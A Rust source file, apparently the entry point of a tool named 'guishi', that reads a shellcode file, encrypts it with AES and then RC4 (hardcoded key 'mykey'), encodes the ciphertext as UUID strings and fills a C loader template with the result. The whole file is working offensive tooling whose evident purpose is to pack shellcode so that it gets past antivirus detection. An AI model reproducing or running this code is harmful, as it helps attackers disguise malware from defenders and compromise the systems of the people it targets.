use std::fs::File;
use std::io::Read;

use rand::rngs::OsRng;
use rand::RngCore;

use guishi::aes_encrypt;
use guishi::config::args::Args;
use clap::Parser;
use console::Term;
use console::style;
use guishi::get_c_arr;
use guishi::get_len;

use guishi::rc4_encrypt;
use guishi::uuid_encode;
use guishi::vec_to_string;
use guishi::config::structs::TPL_1_MAIN_C;
use guishi::config::structs::BANNER;


fn main() {
    println!("{}",BANNER);


    // CONFIG
    let _term = Term::stdout();
    let args = Args::parse();
    let s_shell_code_file = args.file_path;


    // READ SHELLCODE 
    let mut shell_code_file = match File::open(&s_shell_code_file){
        Ok(shell_code_file) => shell_code_file,
        Err(e) => {
            println!("{} Can't Open ShellCode File: {}", style("[ERROR]").red(), e);
            std::process::exit(1);
        }
    };

    println!("{} ShellCode File Path: {}", style("[*]").green() ,style(&s_shell_code_file).cyan());

    let metadata = std::fs::metadata(&s_shell_code_file).unwrap();
    let mut shell_code_buffer: Vec<u8> = vec![0; metadata.len() as usize];
    shell_code_file.read(&mut shell_code_buffer).unwrap();
    get_len(&shell_code_buffer, &mut String::from("shell_code_buffer"));

    print!("\n");
    let mut aes_key = [0u8; 32];
    let mut aes_iv = [0u8; 16];
    OsRng.fill_bytes(&mut aes_key);
    OsRng.fill_bytes(&mut aes_iv);
    // AES ENCRYPT
    let aes_encrypt_shellcode_buffer = aes_encrypt(&shell_code_buffer,&aes_key, &aes_iv);


    // // RC4 ENCRYPT
    let key = b"mykey";
    let ciphertext = rc4_encrypt(key, &aes_encrypt_shellcode_buffer);




    // UUID ENCRYPT
    let result = uuid_encode(&vec_to_string(&ciphertext));
    let mut output_uuid_arr = String::new();
    for uuid in result.clone() {
        output_uuid_arr.push_str("\"");
        output_uuid_arr.push_str(&uuid.to_uppercase().to_string());
        output_uuid_arr.push_str("\"");
        output_uuid_arr.push_str(",");
    }
    output_uuid_arr.pop();

    // GEN TPL
    //
    let aes_arr = get_c_arr(&mut Vec::from(aes_key));
    let aes_iv = get_c_arr(&mut Vec::from(aes_iv));
    let tpl_1 = TPL_1_MAIN_C;
    let gen_tpl_1 = tpl_1.replace("{replace_shellcode_len}", &shell_code_buffer.len().to_string())
        .replace("{replace_uuid_line}", &result.len().to_string())
        .replace("{replace_enc_len}", &ciphertext.len().to_string())
        .replace("{replace_uuid_arr}", &output_uuid_arr)
        .replace("{replace_aes_key_arr}", &aes_arr)
        .replace("{replace_aes_iv_arr}", &aes_iv);

    println!("{}",gen_tpl_1);

}


